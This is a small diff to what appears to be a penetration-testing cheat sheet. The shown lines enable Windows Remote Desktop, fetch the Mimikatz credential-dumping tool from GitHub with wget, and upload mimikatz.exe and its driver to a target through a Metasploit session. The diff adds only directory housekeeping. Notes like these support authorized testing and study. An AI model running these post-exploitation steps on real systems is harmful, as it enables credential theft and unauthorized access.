@@ -122,6 +122,8 @@ net start termservice
 sc config termservice start= auto  
 ## Mimikatz
 wget "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180205/mimikatz_trunk.zip"  
+mkdir mimikatz  
+mv mimikatz_trunk.zip mimikatz/  
 unzip mimikatz_trunk.zip  
 (msf) upload /opt/x64/mimikatz.exe .  
 (msf) upload /opt/x64/mimidrv.sys .  
